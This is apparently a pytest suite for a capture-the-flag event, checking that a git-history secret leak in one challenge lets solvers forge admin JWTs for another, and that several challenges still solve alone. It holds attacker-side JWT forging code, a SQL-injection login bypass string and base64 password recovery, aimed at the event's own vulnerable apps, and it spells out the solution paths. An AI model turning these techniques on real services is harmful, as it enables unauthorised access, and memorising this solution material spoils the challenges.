"""Cross-references between challenges (references, not gates).

Covers the real 11 -> 10 chain (shared JWT secret) and confirms every affected
challenge still solves standalone, plus the soft references (13/09 identity,
share decoy, 06<->10 flavour).
"""
import base64
import hashlib
import hmac
import importlib.util
import json
import os
import pathlib
import re
import subprocess
import sys
from urllib.parse import quote

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[1]
DEFAULT_SECRET = "DecaFlop2026"


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


def _forge_hs256(secret, payload):
    """Attacker-side: forge a JWT with a known secret, no library, no app code."""
    def b64u(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=")
    h = b64u(b'{"alg":"HS256","typ":"JWT"}')
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(hmac.new(secret.encode(), h + b"." + p, hashlib.sha256).digest())
    return (h + b"." + p + b"." + sig).decode()


def _build_gitleak(tmp_path, flag, api_secret=None):
    """Run 11's real entrypoint to build the git history; return the site dir.

    A stub `python` on PATH makes the script's final `exec python /app/app.py`
    a no-op, so only the git-building part runs.
    """
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "python").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "python").chmod(0o755)
    site = tmp_path / "site"
    env = dict(os.environ, PATH=f"{bindir}:{os.environ['PATH']}",
               SITE_DIR=str(site), FLAG=flag)
    if api_secret is not None:
        env["API_JWT_SECRET"] = api_secret
    else:
        env.pop("API_JWT_SECRET", None)
    subprocess.run(["sh", str(ROOT / "challenges" / "11-web-gitleak" / "app" / "entrypoint.sh")],
                   check=True, env=env, capture_output=True)
    return site


def _git_show(site, ref):
    return subprocess.run(["git", "-C", str(site), "show", ref],
                          capture_output=True, text=True, check=True).stdout


# ---------------------------------------------------------------- Ref 4: 11 -> 10
def test_gitleak_history_holds_both_secrets(tmp_path):
    site = _build_gitleak(tmp_path, "TRIATHLON{export_token_x}")
    old = _git_show(site, "HEAD~1:config.py")
    # 11 solo: the export token (flag) is recoverable from the previous commit
    assert 'EXPORT_TOKEN = "TRIATHLON{export_token_x}"' in old
    # and so is 10's signing secret (the alternate route), defaulting to 10's default
    assert f'RESULTS_API_JWT_SECRET = "{DEFAULT_SECRET}"' in old
    # the current commit cleaned both out to env vars
    head = _git_show(site, "HEAD:config.py")
    assert DEFAULT_SECRET not in head
    assert "TRIATHLON{" not in head


def test_recovered_secret_equals_10_secret_and_forges_flag(tmp_path, monkeypatch):
    # 10 running on its own default secret, with a known flag
    monkeypatch.setenv("JWT_SECRET", DEFAULT_SECRET)
    monkeypatch.setenv("FLAG", "TRIATHLON{jwt_chain_flag}")
    jwt10 = _load("jwt10_chain", ROOT / "challenges" / "10-web-jwt" / "app" / "app.py")

    # recover the secret purely from 11's built git history
    site = _build_gitleak(tmp_path, "TRIATHLON{export_token_x}")
    recovered = re.search(r'RESULTS_API_JWT_SECRET = "([^"]+)"',
                          _git_show(site, "HEAD~1:config.py")).group(1)
    assert recovered == jwt10.SECRET.decode()        # same value 10 signs with

    # forge an admin token with the recovered secret and call the real API
    token = _forge_hs256(recovered, {"role": "admin", "bib": 1042})
    r = jwt10.app.test_client().get("/api/results", headers={"Authorization": "Bearer " + token})
    assert r.status_code == 200
    assert json.loads(r.data)["flag"] == "TRIATHLON{jwt_chain_flag}"


def test_10_still_solvable_blind(monkeypatch):
    # the "crack the weak secret" path still works on its own (no 11 needed)
    monkeypatch.setenv("JWT_SECRET", DEFAULT_SECRET)
    monkeypatch.setenv("FLAG", "TRIATHLON{jwt_blind_flag}")
    jwt10 = _load("jwt10_blind", ROOT / "challenges" / "10-web-jwt" / "app" / "app.py")
    c = jwt10.app.test_client()
    # guest token has role=viewer -> no flag
    guest = json.loads(c.get("/api/token").data)["token"]
    assert "flag" not in json.loads(c.get("/api/results", headers={"Authorization": "Bearer " + guest}).data)
    # forge admin with the cracked default secret -> flag
    token = _forge_hs256(DEFAULT_SECRET, {"role": "admin"})
    assert json.loads(c.get("/api/results", headers={"Authorization": "Bearer " + token}).data)["flag"] \
        == "TRIATHLON{jwt_blind_flag}"


def test_gitleak_and_jwt_default_to_the_same_literal():
    # entrypoint default and 10's default must match, or the chain silently breaks
    entry = (ROOT / "challenges" / "11-web-gitleak" / "app" / "entrypoint.sh").read_text()
    assert f'API_JWT_SECRET:-{DEFAULT_SECRET}' in entry
    jwt_src = (ROOT / "challenges" / "10-web-jwt" / "app" / "app.py").read_text()
    assert f'"JWT_SECRET", "{DEFAULT_SECRET}"' in jwt_src
    # one compose var (JWT_SECRET) feeds both services, same default
    compose = (ROOT / "docker-compose.yml").read_text()
    assert compose.count(f"JWT_SECRET:-{DEFAULT_SECRET}") >= 2


# ---------------------------------------------------------------- Ref 3: 06 <-> 10
def test_06_mentions_new_json_api(monkeypatch):
    monkeypatch.setenv("FLAG", "TRIATHLON{sqli_ref_flag}")
    sqli = _load("sqli_ref", ROOT / "challenges" / "06-web-sqli" / "app" / "app.py")
    r = sqli.app.test_client().post("/login", data={"username": "' OR '1'='1' -- ", "password": "x"})
    body = r.data.decode()
    assert "TRIATHLON{sqli_ref_flag}" in body                  # SQLi solo unchanged
    assert "nouvelle API" in body and "JSON" in body           # flavour mention


def test_10_mentions_replacing_web_admin(monkeypatch):
    monkeypatch.setenv("FLAG", "TRIATHLON{x}")
    jwt10 = _load("jwt10_home", ROOT / "challenges" / "10-web-jwt" / "app" / "app.py")
    home = jwt10.app.test_client().get("/").data.decode()
    assert "admin" in home.lower() and "remplace" in home.lower()


# ---------------------------------------------------------------- Ref 1: 13 identity
def test_13_sap_shortcut_identity_and_base64(dist):
    sap = (dist / "dflop_erp.sap").read_text(encoding="utf-8")
    # 13 solo: the saved password still base64-decodes to the flag
    pw = re.search(r"Password=(\S+)", sap).group(1)
    assert base64.b64decode(pw).decode() == "TRIATHLON{sap_shortcut_test}"
    # and it now identifies the shared production system (DFL / 001)
    assert "Name=DFL" in sap and "Client=001" in sap
    assert "production" in sap.lower()


# ---------------------------------------------------------------- Ref 2: share decoy
def test_share_decoy_breadcrumb(share, share_module):
    note = next((f for f in share_module.FILES if f["name"] == "notes_basis.txt"), None)
    assert note is not None and note["decoy"]
    text = note["text"]
    # it points at the gateway monitor port and the ABAP dev folder
    assert "8014" in text
    assert "Developpements" in text or "Développements" in text
    # but holds no secrets, flags or payloads
    assert "TRIATHLON{" not in text
    assert DEFAULT_SECRET not in text
    assert "mot de passe" not in text.lower() and "password" not in text.lower()
    # and it downloads as plain text
    url = "/telecharger/" + "/".join(quote(s) for s in note["path"])
    r = share.get(url)
    assert r.status_code == 200 and r.mimetype == "text/plain"


# ---------------------------------------------------------------- ctfd still parses 14
def test_ctfd_setup_still_parses_14():
    env = dict(os.environ)
    env.pop("HANDOUT_DIR", None)
    out = subprocess.run(
        [sys.executable, str(ROOT / "scripts" / "ctfd-setup.py"),
         "--dry-run", "--env", str(ROOT / ".env.example")],
        capture_output=True, text=True, check=True, env=env).stdout
    challenge_lines = [ln for ln in out.splitlines() if ln[:2].isdigit()]
    assert len(challenge_lines) == 14
